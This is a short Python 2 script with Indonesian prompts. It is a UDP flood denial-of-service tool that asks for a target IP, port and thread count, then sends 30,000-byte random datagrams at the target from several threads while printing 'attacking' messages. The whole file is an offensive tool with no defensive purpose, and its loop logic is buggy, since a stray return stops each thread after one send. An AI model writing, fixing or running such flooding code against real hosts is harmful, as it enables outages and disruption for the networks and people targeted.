import time 
import datetime 
import socket
import random
import sys 
import os 
import signal
import threading

os.system("clear") 
time = time.ctime(time.time()) 
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = raw_input ("\033[95mMasukkan ip/host target:") 
port = input ("Masukkan port: ")
thread = input ("Thread:") 
packet = input ("packet:")

def use():
    bytes = random._urandom(30000)  
    sent = packet
 
    while True:
             try:
                 sent = packet
                 for x in range(thread):
                       sock.sendto(bytes, (ip,port))   
                       print "\033[94mWaktu \033[91m%s \033[94mMenyerang \033[91m%s \033[94mdengan port \033[91m%s \033[94mbytes \033[91m%s thread %s"%(time, ip, port, sent, thread)                        
                       return
             except socket.error as e:
                 print "\033[91mTidak ada koneksi internet, Coba periksa koneksi internet anda"     
                        
def keyboard_interrupt(signal,jendela):
    print "\033[92mBerhenti"
    sys.exit(0)
signal.signal(signal.SIGINT, keyboard_interrupt)

if __name__ =='__main__': 
       threads = []
       for i in range(thread):
           t = threading.Thread(target = use)
           threads.append(t)
           t.start() 